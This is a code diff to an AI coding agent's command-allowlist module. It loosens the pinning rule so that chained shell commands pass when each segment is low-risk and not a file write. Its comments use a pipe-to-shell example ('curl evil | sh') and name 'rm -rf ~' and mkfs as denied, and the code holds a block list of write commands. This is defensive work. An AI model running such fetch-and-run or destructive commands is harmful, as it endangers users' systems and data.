@@ -13,9 +13,13 @@
  *  - EXACT-MATCH ONLY: the stored string must equal the incoming command
  *    byte-for-byte. `cargo check` allowed ≠ `cargo check && curl evil | sh`
  *    allowed — chaining a second command produces a different string.
- *  - RISK-GATED ENTRY: only commands the policy layer rates low-risk and
- *    that contain no shell chaining/substitution can be pinned at all.
- *    `rm -rf` can never be allowlisted, by construction.
+ *  - RISK-GATED ENTRY (per segment): the full command passes the hard
+ *    deny-list, then EVERY `;`/`&&`/`||`/`|`/newline-separated segment
+ *    must be low-risk, warning-free, and not write-shaped (rm/cp/tee/…).
+ *    Real-world commands are chains (`cd x && cargo check`) — the old
+ *    one-simple-invocation rule made the button unreachable. Exact-match
+ *    pinning makes the chain itself the unit of approval, so a pinned
+ *    chain still only ever approves THAT string.
  *  - AGENT-UNWRITABLE STORE: entries live at
  *    `~/.kai/allowlist/<workspace-hash>/allowlist.json` — outside every
  *    project (compare kaiPaths.ts rationale), and the path is blocked for
@@ -73,22 +77,99 @@ async function loadRoot(root: string): Promise<Set<string>> {
 
 /**
  * Can this command be pinned at all? Conservative gate:
- *  - the policy analyzer must rate it low-risk (no rm/sudo/eval/…)
- *  - its own `safe` verdict must hold (passes the hard deny-lists)
- *  - no shell chaining (`&&`, `||`, `;`, `|`), substitution, or redirection —
- *    a pinned command must be ONE simple invocation
+ *  - the policy analyzer must rate the FULL command safe (hard deny-lists:
+ *    pipe-to-shell, rm -rf ~, mkfs, … — these can cross segments, so they
+ *    run on the whole string)
+ *  - no substitution (`$(…)`, backticks), redirection (`<`, `>`, `2>&1`),
+ *    backgrounding (`cmd &`), or line continuation — a pinned command must
+ *    be a literal invocation whose visible text is the whole story
+ *  - split into `;` / `&&` / `||` / `|` / newline segments (quote-aware):
+ *    EVERY segment must be low-risk and warning-free, and NO segment may be
+ *    write-shaped (rm/mv/cp/tee/mkdir/… — a pin must never auto-approve a
+ *    file write/delete). Real-world commands are chains (`cd x && cargo
+ *    check`) — the old one-simple-invocation rule made the button
+ *    unreachable in practice.
  *  - bounded length
  */
+
+/** Write-shaped segment commands — a pin must never auto-approve a
+ *  write/delete, even a "low-risk" one. */
+const WRITE_SHAPED = new Set([
+  "rm", "rmdir", "mv", "cp", "rsync", "dd", "tee", "shred", "truncate",
+  "install", "mkdir", "touch", "ln", "chown", "chmod", "setfacl",
+]);
+
+/** Split a command into chain segments, quote-aware. Single `&` (background)
+ *  is NOT a separator — it is rejected by the pre-check below. */
+function splitSegments(cmd: string): string[] {
+  const out: string[] = [];
+  let cur = "";
+  let quote: '"' | "'" | null = null;
+  for (let i = 0; i < cmd.length; i++) {
+    const ch = cmd[i]!;
+    if (quote) {
+      if (ch === quote) quote = null;
+      cur += ch;
+      continue;
+    }
+    if (ch === '"' || ch === "'") {
+      quote = ch;
+      cur += ch;
+      continue;
+    }
+    if (ch === "\\" && i + 1 < cmd.length) {
+      cur += ch + cmd[i + 1]!;
+      i++;
+      continue;
+    }
+    if (ch === ";" || ch === "\n") {
+      out.push(cur);
+      cur = "";
+      continue;
+    }
+    if (ch === "|" || ch === "&") {
+      // `|`, `||`, `&&` are separators; single `&` stays (pre-check rejects it).
+      if (cmd[i + 1] === ch) i++;
+      out.push(cur);
+      cur = "";
+      continue;
+    }
+    cur += ch;
+  }
+  out.push(cur);
+  return out.map((s) => s.trim()).filter((s) => s.length > 0);
+}
+
+/** Leading command word of a segment, skipping `VAR=value` prefixes. */
+function commandWord(segment: string): string {
+  for (const t of segment.split(/\s+/)) {
+    if (!/^[A-Za-z_][A-Za-z0-9_]*=/.test(t)) return t.toLowerCase();
+  }
+  return "";
+}
+
 export function isAllowlistable(command: string): boolean {
   const cmd = command.trim();
   if (!cmd || cmd.length > 200) return false;
-  const analysis = analyzeShellCommand(cmd);
-  if (!analysis.safe) return false;
-  if (analysis.riskLevel !== "low") return false;
-  if (analysis.warnings.length > 0) return false;
-  // One simple command: no chaining, no pipes, no substitution, no
-  // redirection, no backgrounding, no line continuation.
-  if (/[;&|]|\$\(|`|>|<|&\s*$|\\\n/.test(cmd)) return false;
+  // Whole-string policy gate — hard deny-list patterns (pipe-to-shell,
+  // rm -rf ~, …) can CROSS segments, so they must run on the full text.
+  const whole = analyzeShellCommand(cmd);
+  if (!whole.safe) return false;
+  if (whole.riskLevel !== "low" || whole.warnings.length > 0) return false;
+  // Literal-invocation gate: substitution, redirection, backgrounding, and
+  // continuations are invisible-effect syntax — a pin must be exactly what
+  // it looks like. Quote-blind by design: `grep "a>b"` is a false negative
+  // we accept, never a false positive.
+  if (/\r|\$\(|`|<|>/.test(cmd)) return false;
+  if (/(^|\s)&(\s|$)/.test(cmd)) return false; // backgrounding (`2>&1` has `>` above)
+  const segments = splitSegments(cmd);
+  if (segments.length === 0) return false;
+  for (const seg of segments) {
+    if (/\\$/.test(seg)) return false; // line continuation
+    if (WRITE_SHAPED.has(commandWord(seg))) return false;
+    const a = analyzeShellCommand(seg);
+    if (!a.safe || a.riskLevel !== "low" || a.warnings.length > 0) return false;
+  }
   return true;
 }
 
